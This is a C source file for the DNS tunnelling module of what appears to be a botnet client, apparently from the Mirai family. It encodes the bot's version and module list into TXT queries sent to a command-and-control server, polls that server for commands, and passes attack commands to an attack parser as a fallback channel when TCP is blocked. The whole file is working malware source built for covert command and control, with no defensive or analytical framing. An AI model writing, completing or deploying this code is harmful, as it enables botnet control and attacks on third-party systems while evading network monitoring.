#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdint.h>

#include "includes.h"
#include "dns_tunnel.h"
#include "util.h"
#include "rand.h"
#include "attack.h"
#include "module.h"
#include "proto.h"
#include "polymorphic.h"

// DNS header (12 bytes)
struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
} __attribute__((packed));

#define DNS_FLAG_QR    0x8000
#define DNS_FLAG_RD    0x0100
#define DNS_FLAG_RA    0x0080
#define DNS_FLAG_RCODE_NXDOMAIN 0x0003

#define DNS_TYPE_TXT   16
#define DNS_CLASS_IN   1
#define DNS_MAX_PACKET 512
#define HEX_BUF_MAX    256
#define LABEL_MAX      63

// hex encode len bytes from src to dst (dst must be 2*len+1)
static void hex_encode(const uint8_t *src, int len, char *dst)
{
    static const char hex[] = "0123456789abcdef";
    for (int i = 0; i < len; i++) {
        dst[i*2] = hex[(src[i] >> 4) & 0x0F];
        dst[i*2+1] = hex[src[i] & 0x0F];
    }
    dst[len*2] = '\0';
}

// hex decode from src to dst (returns decoded length, -1 on error)
static int hex_decode(const char *src, uint8_t *dst, int max_len)
{
    int slen = util_strlen((char *)src);
    if (slen % 2 != 0 || slen/2 > max_len)
        return -1;
    int dlen = 0;
    for (int i = 0; i < slen; i += 2) {
        uint8_t hi = 0, lo = 0;
        if (src[i] >= '0' && src[i] <= '9') hi = src[i] - '0';
        else if (src[i] >= 'a' && src[i] <= 'f') hi = src[i] - 'a' + 10;
        else if (src[i] >= 'A' && src[i] <= 'F') hi = src[i] - 'A' + 10;
        else return -1;
        if (src[i+1] >= '0' && src[i+1] <= '9') lo = src[i+1] - '0';
        else if (src[i+1] >= 'a' && src[i+1] <= 'f') lo = src[i+1] - 'a' + 10;
        else if (src[i+1] >= 'A' && src[i+1] <= 'F') lo = src[i+1] - 'A' + 10;
        else return -1;
        dst[dlen++] = (hi << 4) | lo;
    }
    return dlen;
}

// write a DNS name (series of labels) from dot-separated domain into buf
// returns bytes written
static int dns_write_name(uint8_t *buf, const char *name)
{
    int off = 0;
    const char *p = name;
    while (*p) {
        const char *dot = p;
        while (*dot && *dot != '.') dot++;
        int llen = dot - p;
        if (llen > LABEL_MAX || llen == 0)
            return -1;
        buf[off++] = (uint8_t)llen;
        util_memcpy(buf + off, (void *)p, llen);
        off += llen;
        p = (*dot == '.') ? dot + 1 : dot;
    }
    buf[off++] = 0; // root label
    return off;
}

// build DNS TXT query packet
// query: <hex_payload>.d.<domain>
// returns packet length, or -1 on error
static int dns_build_query(uint8_t *buf, int buf_max, uint16_t id,
                           const char *domain, const uint8_t *payload, int payload_len)
{
    if (payload_len > 120)
        return -1;

    char hexbuf[HEX_BUF_MAX];
    hex_encode(payload, payload_len, hexbuf);
    int hexlen = util_strlen(hexbuf);
    if (hexlen > 63 || hexlen + 3 + util_strlen((char *)domain) + 1 > 255)
        return -1;

    // build full name: <hex>.d.<domain>
    char fullname[256];
    util_strcpy(fullname, hexbuf);
    util_strcat(fullname, ".d.");
    util_strcat(fullname, domain);

    int off = 0;
    struct dns_header *hdr = (struct dns_header *)buf;
    hdr->id = htons(id);
    hdr->flags = htons(DNS_FLAG_RD); // recursion desired
    hdr->qdcount = htons(1);
    hdr->ancount = 0;
    hdr->nscount = 0;
    hdr->arcount = 0;
    off += sizeof(struct dns_header);

    int nlen = dns_write_name(buf + off, fullname);
    if (nlen < 0) return -1;
    off += nlen;

    uint16_t qtype = htons(DNS_TYPE_TXT);
    uint16_t qclass = htons(DNS_CLASS_IN);
    util_memcpy(buf + off, &qtype, 2);
    off += 2;
    util_memcpy(buf + off, &qclass, 2);
    off += 2;

    return off;
}

// parse DNS response and extract first TXT record
// returns TXT data length, or -1 on error
static int dns_parse_response(const uint8_t *buf, int buflen,
                              uint8_t *out_data, int out_max)
{
    if (buflen < (int)sizeof(struct dns_header))
        return -1;

    const struct dns_header *hdr = (const struct dns_header *)buf;
    uint16_t flags = ntohs(hdr->flags);

    // check for NXDOMAIN
    if ((flags & DNS_FLAG_RCODE_NXDOMAIN) == DNS_FLAG_RCODE_NXDOMAIN)
        return 0; // no data

    uint16_t ancount = ntohs(hdr->ancount);
    if (ancount == 0)
        return 0;

    // skip questions
    int off = sizeof(struct dns_header);
    uint16_t qdcount = ntohs(hdr->qdcount);
    for (int i = 0; i < qdcount; i++) {
        // skip labels
        while (off < buflen) {
            if (buf[off] == 0) { off++; break; }
            if ((buf[off] & 0xC0) == 0xC0) { off += 2; break; } // pointer
            off += 1 + buf[off];
        }
        off += 4; // QTYPE + QCLASS
    }

    // parse answers
    for (int i = 0; i < ancount; i++) {
        // skip NAME
        if (off >= buflen) return -1;
        if ((buf[off] & 0xC0) == 0xC0) {
            off += 2;
        } else {
            while (off < buflen && buf[off] != 0) off += 1 + buf[off];
            if (off >= buflen) return -1;
            off++; // null byte
        }

        if (off + 10 > buflen) return -1;
        uint16_t rtype = ntohs(*(uint16_t *)(buf + off));
        off += 2;
        uint16_t rclass = ntohs(*(uint16_t *)(buf + off));
        (void)rclass;
        off += 2;
        uint32_t rttl = ntohl(*(uint32_t *)(buf + off));
        (void)rttl;
        off += 4;
        uint16_t rdlength = ntohs(*(uint16_t *)(buf + off));
        off += 2;

        if (rtype == DNS_TYPE_TXT && rdlength > 0 && off + rdlength <= buflen) {
            // TXT record: first byte is string length
            uint8_t txt_len = buf[off];
            if (txt_len > 0 && off + 1 + txt_len <= buflen) {
                int dlen = hex_decode((const char *)(buf + off + 1), out_data, out_max);
                return dlen;
            }
        }
        off += rdlength;
    }

    return -1;
}

int dns_tunnel_init(struct dns_tunnel_ctx *ctx, uint32_t cnc_ip_addr)
{
    util_zero(ctx, sizeof(struct dns_tunnel_ctx));
    ctx->cnc_ip = cnc_ip_addr;
    ctx->seq = (uint16_t)(rand_next() & 0xFFFF);
    ctx->active = 1;
    ctx->query_interval = 5; // seconds between queries

    ctx->dns_addr.sin_family = AF_INET;
    ctx->dns_addr.sin_addr.s_addr = cnc_ip_addr;
    ctx->dns_addr.sin_port = htons(DNS_PORT);

    ctx->fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (ctx->fd < 0) {
        ctx->active = 0;
        return -1;
    }

    struct timeval tv = {5, 0}; // 5 second timeout
    setsockopt(ctx->fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    return 0;
}

int dns_tunnel_handshake(struct dns_tunnel_ctx *ctx, const char *source)
{
    // payload: [seq:2][uid:4][source...]
    uint8_t payload[64];
    ctx->seq++;
    payload[0] = (ctx->seq >> 8) & 0xFF;
    payload[1] = ctx->seq & 0xFF;
    payload[2] = (ctx->uid >> 24) & 0xFF;
    payload[3] = (ctx->uid >> 16) & 0xFF;
    payload[4] = (ctx->uid >> 8) & 0xFF;
    payload[5] = ctx->uid & 0xFF;
    int slen = util_strlen((char *)source);
    if (slen > 24) slen = 24;
    payload[6] = 'h'; // type: handshake
    payload[7] = (uint8_t)slen;
    util_memcpy(payload + 8, (void *)source, slen);
    int plen = 8 + slen;

    uint8_t reqbuf[DNS_MAX_PACKET];
    uint16_t id = (uint16_t)(rand_next() & 0xFFFF);
    int rlen = dns_build_query(reqbuf, sizeof(reqbuf), id, DNS_DOMAIN, payload, plen);
    if (rlen < 0) return -1;

    if (sendto(ctx->fd, reqbuf, rlen, 0,
               (struct sockaddr *)&ctx->dns_addr, sizeof(ctx->dns_addr)) < 0)
        return -1;

    uint8_t resp[DNS_MAX_PACKET];
    int n = recv(ctx->fd, resp, sizeof(resp), 0);
    if (n < 0) return -1;

    uint8_t outdata[256];
    int dlen = dns_parse_response(resp, n, outdata, sizeof(outdata));
    if (dlen < 6) return -1; // need at least seq(2) + data

    // first 2 bytes of decoded data are seq
    uint16_t rseq = ((uint16_t)outdata[0] << 8) | outdata[1];
    if (rseq != ctx->seq) return -1;

    // if handshake response contains UID
    if (dlen >= 6) {
        ctx->uid = ((uint32_t)outdata[2] << 24) |
                  ((uint32_t)outdata[3] << 16) |
                  ((uint32_t)outdata[4] << 8) |
                  outdata[5];
    }

    return 0;
}

int dns_tunnel_send(struct dns_tunnel_ctx *ctx, uint8_t pkt_type,
                    const uint8_t *data, int data_len)
{
    ctx->seq++;
    uint8_t payload[HEX_BUF_MAX];
    int off = 0;

    // seq (2 bytes) + type (1 byte) + data
    payload[off++] = (ctx->seq >> 8) & 0xFF;
    payload[off++] = ctx->seq & 0xFF;
    payload[off++] = (ctx->uid >> 24) & 0xFF;
    payload[off++] = (ctx->uid >> 16) & 0xFF;
    payload[off++] = (ctx->uid >> 8) & 0xFF;
    payload[off++] = ctx->uid & 0xFF;
    payload[off++] = pkt_type;

    int max_data = (HEX_BUF_MAX / 2) - off;
    if (data_len > max_data) data_len = max_data;
    if (data_len > 0) {
        util_memcpy(payload + off, (void *)data, data_len);
        off += data_len;
    }

    uint8_t reqbuf[DNS_MAX_PACKET];
    uint16_t id = (uint16_t)(rand_next() & 0xFFFF);
    int rlen = dns_build_query(reqbuf, sizeof(reqbuf), id, DNS_DOMAIN, payload, off);
    if (rlen < 0) return -1;

    if (sendto(ctx->fd, reqbuf, rlen, 0,
               (struct sockaddr *)&ctx->dns_addr, sizeof(ctx->dns_addr)) < 0)
        return -1;

    return off;
}

int dns_tunnel_recv(struct dns_tunnel_ctx *ctx, uint8_t *out_type,
                    uint8_t *out_data, int *out_len, int max_len)
{
    uint8_t resp[DNS_MAX_PACKET];
    int n = recv(ctx->fd, resp, sizeof(resp), 0);
    if (n < 0) return -1;

    uint8_t decdata[HEX_BUF_MAX];
    int dlen = dns_parse_response(resp, n, decdata, sizeof(decdata));
    if (dlen < 0) return -1;
    if (dlen == 0) return 0; // NXDOMAIN, no data

    // parse: seq(2) + uid(4) + type(1) + data
    if (dlen < 7) return -1;

    // verify seq
    uint16_t rseq = ((uint16_t)decdata[0] << 8) | decdata[1];
    if (rseq != ctx->seq && rseq != ctx->seq - 1)
        return -1;

    uint32_t ruid = ((uint32_t)decdata[2] << 24) |
                    ((uint32_t)decdata[3] << 16) |
                    ((uint32_t)decdata[4] << 8) |
                    decdata[5];
    if (ruid != ctx->uid)
        return -1;

    *out_type = decdata[6];
    int remaining = dlen - 7;
    if (remaining > max_len) remaining = max_len;
    if (remaining > 0)
        util_memcpy(out_data, decdata + 7, remaining);
    *out_len = remaining;

    return dlen;
}

int dns_tunnel_keepalive(struct dns_tunnel_ctx *ctx)
{
    // simple keepalive — send 1 byte seq update
    return dns_tunnel_send(ctx, DNS_PKT_KEEPALIVE, NULL, 0);
}

void dns_tunnel_close(struct dns_tunnel_ctx *ctx)
{
    if (ctx->fd >= 0) {
        close(ctx->fd);
        ctx->fd = -1;
    }
    ctx->active = 0;
}

// main DNS tunnel loop: runs when TCP is unavailable
// returns -1 on error, doesn't return normally
int dns_main_loop(uint32_t cnc_ip, const char *source)
{
    struct dns_tunnel_ctx dctx;
    if (dns_tunnel_init(&dctx, cnc_ip) < 0)
        return -1;

    // micro sleep to spread load
    sleep(rand_next() % 10);

    // handshake
    if (dns_tunnel_handshake(&dctx, source) < 0) {
        dns_tunnel_close(&dctx);
        return -1;
    }

    // send module list as data
    {
        char modbuf[256];
        module_list(modbuf, sizeof(modbuf));
        char info[384];
        int il = util_strlen(BOT_VERSION);
        int ml = util_strlen(modbuf);
        util_memcpy(info, BOT_VERSION, il);
        info[il] = '\0';
        if (ml > 0) {
            info[il + 1] = ',';
            util_memcpy(info + il + 2, modbuf, ml);
            dns_tunnel_send(&dctx, DNS_PKT_DATA, (uint8_t *)info, il + 2 + ml);
        } else {
            dns_tunnel_send(&dctx, DNS_PKT_DATA, (uint8_t *)info, il + 1);
        }
    }

    // main DNS poll loop
    while (dctx.active) {
        // keepalive every 5 seconds
        uint8_t pkt_type;
        uint8_t cmd_data[256];
        int cmd_len = 0;

        int ret = dns_tunnel_recv(&dctx, &pkt_type, cmd_data, &cmd_len, sizeof(cmd_data));

        if (ret < 0) {
            // timeout, send keepalive
            dns_tunnel_keepalive(&dctx);
            sleep(dctx.query_interval);
            continue;
        }

        if (ret == 0) {
            // NXDOMAIN — no commands for now
            sleep(dctx.query_interval);
            continue;
        }

        // process command
        switch (pkt_type) {
            case PKT_TYPE_ATTACK:
                if (cmd_len > 0)
                    attack_parse((char *)cmd_data, cmd_len);
                break;
            case PKT_TYPE_UPDATE:
                break;
        }

        sleep(dctx.query_interval);
    }

    dns_tunnel_close(&dctx);
    return -1;
}
